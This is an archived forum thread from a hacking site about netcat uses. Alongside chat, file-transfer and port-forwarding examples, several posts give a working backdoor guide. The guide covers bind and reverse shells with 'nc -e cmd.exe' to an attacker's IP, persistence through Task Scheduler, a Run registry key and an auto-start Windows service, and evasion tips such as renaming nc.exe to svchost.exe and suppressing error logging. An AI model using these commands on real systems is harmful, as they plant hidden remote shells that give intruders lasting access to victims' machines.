@@ -1,0 +1,358 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=37&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:55:11 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> NetCat - The Swiss Army Knife</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthread2d38.html?t=37">NetCat - The Swiss Army Knife</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthread1d72.html?t=37&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_top">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=37&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="37" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 12">1</a></span><span><a href="printthreada1cc.html?t=37&amp;pp=10&amp;page=2" title="Show results 11 to 12 of 12">2</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthreada1cc.html?t=37&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 12 of 12"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthreada1cc.html?t=37&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 12 of 12">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">07-08-2010, 08:58 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+		<div class="title">NetCat - The Swiss Army Knife</div>
+	
+	<div class="content">
+		<blockquote class="restore">&lt; Originally Posted by b0nd &gt;<br />
+<br />
+It is said that this small tool has as many different usage as many the user of it can think of.<br />
+It was developed in late 90's and is not supported by it's author. Anyways, it has great features and advanced clone of it has been developed by people. E.g. cryptcat, sbd, ncat (comes with NMap) etc.<br />
+<br />
+Let's put all the info which we have about the usage of netcat in this thread and give this tool the respect which it deserves.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">07-08-2010, 08:58 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>NetCat - as chat application</b><br />
+To use net cat as chat application among two systems, following could be done:<br />
+<br />
+<br />
+Run the following at Server side:<br />
+# nc -v -l -p &lt;port_no&gt;<br />
+e.g # nc -v -l -p 8080<br />
+<br />
+<br />
+-v : Verbose<br />
+-l : It's small 'L'. It stands for &quot;Listen mode&quot;. That is, nc is being asked to listen on a port specified after the parameter '-p'<br />
+-p : Port number to listen on<br />
+<br />
+So by this time one -color: rgb(255, 255, 102);&quot;&gt;netcat has started listening on one server on port 8080 and awaiting someone to connect to it.<br />
+<br />
+<br />
+Run the following at Client side:<br />
+# nc -v &lt;IP-of-Server&gt; &lt;port_no&gt;<br />
+e.g. # nc -v 192.168.1.5 8080<br />
+<br />
+<br />
+IP: IP of the machine which has -color: rgb(255, 255, 102);&quot;&gt;netcat in listening mode<br />
+Port: Port at which the remote machine is awaiting for connection<br />
+<br />
+After the connection has been established, you would be able to send the chat data on the network among two machines.<br />
+<br />
+Drawbacks:<br />
+1. Text is sent as un-encrypted data, hence could be sniffed<br />
+2. Chatting is not very appealing :).<br />
+3. Server should have public IP to listen on, or need to do port forwarding at Gateway of NATed network.<br />
+<br />
+SBD tool is much better for chat. Encrypted transfer and &quot;chat-ids&quot; can be specified using it.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">07-08-2010, 09:01 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Netcat Cheat Sheet ( Contributed by eberly)<br />
+<br />
+<a href="../www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf" target="_blank">http://www.sans.org/security-resourc...t_sheet_v1.pdf</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">07-08-2010, 09:03 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Transfering Files using Netcat</b><br />
+Pulling file from Server<br />
+&#8226; Server: # nc &#8211;v &#8211;l &#8211;p 8080 &lt; some_file_at_server<br />
+&#8226; Client: # nc -v [IP-of-Server] 8080 &gt; some_file_at_client<br />
+&#8226; When connection is established to server, the file from server will get transferred to client side and would be named as some_file_at_client.<br />
+<br />
+Pushing to Server<br />
+&#8226; Server: # nc &#8211;v &#8211;l &#8211;p 8080 &gt; some_file_at_server<br />
+&#8226; Client: # nc -v [IP-of-Server] 8080 &lt; some_file_at_client<br />
+&#8226; When connection is established to server, the file from Client will get transferred to Server and would be named as some_file_at_server.<br />
+<br />
+<br />
+Any file can be transferred, be it text or rar or html etc.<br />
+Applicable for both, Linux and windows version of Netcat.<br />
+<br />
+Drawback:<br />
+1. Traffic is not encrypted<br />
+2. No way of knowing whether transfer has been completed :(. It won't display any message, it won't breaks the connection. Based on the size of file and monitoring the traffic it can be determined whether file has been transferred or not.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">07-08-2010, 09:04 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>NetCat as backdoor</b><br />
+Direct binding<br />
+<br />
+&#8226; Run NC as a daemon waiting for incoming connection<br />
+<br />
+# nc -d -L -p 8080 -e cmd.exe<br />
+<br />
+&#8226; -d: detach from console, make it as background process<br />
+&#8226; -L: listen harder i.e. if connection is disconnected, it will again start listening. This feature was available for windows version only, but with some newer versions for linux this is available as well.<br />
+&#8226; -e : Inbound program to execute<br />
+<br />
+<br />
+In case of linux: instead of cmd.exe, run /bin/bash or /bin/sh etc.<br />
+<br />
+__________________________________________________  _________<br />
+<br />
+Reverse binding<br />
+&#8226; # nc -d &lt;our IP&gt; &lt;our port&gt; -e cmd.exe<br />
+&#8226; # nc -d &lt;our IP&gt; &lt;our port&gt; -e %SystemRoot%\System32\cmd.exe<br />
+&#8226; # nc -d &lt;our IP&gt; &lt;our port&gt; -e %COMSPEC%<br />
+<br />
+&#8226; The drawback with this connection method is, we have to wait until and event (Task Scheduler) or user-driven action (logs on to the system or reboots the computer) triggers our backdoor commands to connect to the NC listener on our attack system. Bottom line is, that netcat has to be triggered on remote machine.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">07-08-2010, 09:05 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Triggering netcat as back door</b><br />
+Couple of ways to trigger netcat as a back door:<br />
+<br />
+_____________________<br />
+<br />
+<b>1. Executing the back door using Windows Task Scheduler</b><br />
+&gt;&gt; Check whether Task Scheduler is &quot;enabled&quot;<br />
+c:\ at<br />
+<br />
+&gt;&gt; Enabling the Task Scheduler if &quot;disabled&quot;<br />
+c:\ net start schedule<br />
+<br />
+&gt;&gt; Adding the schedule for net cat (back door)<br />
+c:\ at 15:00:00 /every:m,t,w,th,f,s,su &quot;&quot;c:\&lt;path&gt;\nc.exe -d &lt;IP for reverse connect&gt; &lt;port_no&gt; -e cmd.exe&quot;&quot;<br />
+<br />
+&gt;&gt; Check the scheduler again to verify new job has been added properly, in case of mistake, delete the job and make a new one.<br />
+c:\ at [id-of-your-job] /delete<br />
+<br />
+Note: To be more stealthy, rename nc.exe to some windows process and also make a copy of cmd.exe. e.g. rename nc.exe to svchost.exe and cmd.exe to explorer.exe. But make sure you don't mess up the original window files. Just make copy of them and keep in separate folder.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_7">
+	<div class="header">
+		<div class="datetime">07-08-2010, 09:05 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>2. Executing the  back door using a Registry Entry</b><br />
+<br />
+The back door would be triggered when the user logs on to the system.<br />
+Add the registry key like following from command prompt:<br />
+<br />
+c:\ reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v -color: rgb(255, 255, 102);&quot;&gt;netcat /t REG_SZ /d &quot;c:\&lt;path&gt;\nc.exe -d &lt;IP_for_reverse_connect&gt; &lt;remote_port&gt; -e cmd.exe&quot;<br />
+<br />
+As stated, the back door would be executed when some one logs into the system and you would leverage his &quot;privilege&quot;, i.e. you could have a normal user privilege or of a administrator depending on the privilege of user logging in.<br />
+<br />
+Drawback: If shell has been lost, have to wait for the user to log-off and log-in again to trigger the back door connection.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_8">
+	<div class="header">
+		<div class="datetime">07-08-2010, 09:06 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>3. Executing backdoor using Window Service</b><br />
+<br />
+&gt;&gt; Creating the new service (our backdoor) using Windows SC tool<br />
+c:\ sc create -color: rgb(255, 255, 102);&quot;&gt;netcat-backdoor binPATH= &quot;cmd /K start c:\[path]\nc.exe -d [IP-for-reverse-connect] [remote-port] -e cmd.exe&quot; start= auto error= ignore<br />
+<br />
+*Service name would be &quot;-color: rgb(255, 255, 102);&quot;&gt;netcat-backdoor&quot;. So better choose some stealthy name.<br />
+start= auto: Would start back door automatically on Boot<br />
+error= ignore: Don't send errors to the system event logs<br />
+<br />
+&gt;&gt; Start the service<br />
+c:\net start [service-name]<br />
+<br />
+-color: rgb(255, 255, 102);&quot;&gt;Netcat not meant to be run as service will throw error at this stage but will shovel a shell. With every reboot a shell would be smiling at you<br />
+<br />
+Drawback: If shell is lost, will have to wait for server to be rebooted (which could be a couple of months as well)<br />
+<br />
+<br />
+--&gt; Obviously the mentioned techniques are generic ones and can be used for any backdoor.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_9">
+	<div class="header">
+		<div class="datetime">07-08-2010, 11:02 AM</div>
+		<span class="username">prashant_uniyal</span>
+	</div>
+	
+	
+		<div class="title">Port forwarding using NetCat</div>
+	
+	<div class="content">
+		<blockquote class="restore"><b>Port Forwarding or Port Mapping</b><br />
+On Linux, NetCat can be used for port forwarding. Below are nine different ways to do port forwarding in NetCat:<br />
+<i>nc -l -p port1 -c ' nc -l -p port2'<br />
+nc -l -p port1 -c ' nc host2 port2'<br />
+nc -l -p port1 -c ' nc -u -l -p port2'<br />
+nc -l -p port1 -c ' nc -u host2 port2'<br />
+nc host1 port1 -c ' nc host2 port2'<br />
+nc host1 port1 -c ' nc -u -l -p port2'<br />
+nc host1 port1 -c ' nc -u host2 port2'<br />
+nc -u -l -p port1 -c ' nc -u -l -p port2'<br />
+nc -u -l -p port1 -c ' nc -u host2 port2'</i><br />
+---------------------------------------------------------------------------------</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_10">
+	<div class="header">
+		<div class="datetime">07-12-2010, 08:01 PM</div>
+		<span class="username">hemanthvrm</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b><font color="red">tfs................................</font></b></blockquote>
+	</div>
+</li>
+</ul>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthread1d72.html?t=37&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_bottom">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=37&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="37" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 12">1</a></span><span><a href="printthreada1cc.html?t=37&amp;pp=10&amp;page=2" title="Show results 11 to 12 of 12">2</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthreada1cc.html?t=37&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 12 of 12"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthreada1cc.html?t=37&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 12 of 12">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:47 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=37&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:55:12 GMT -->
+</html>
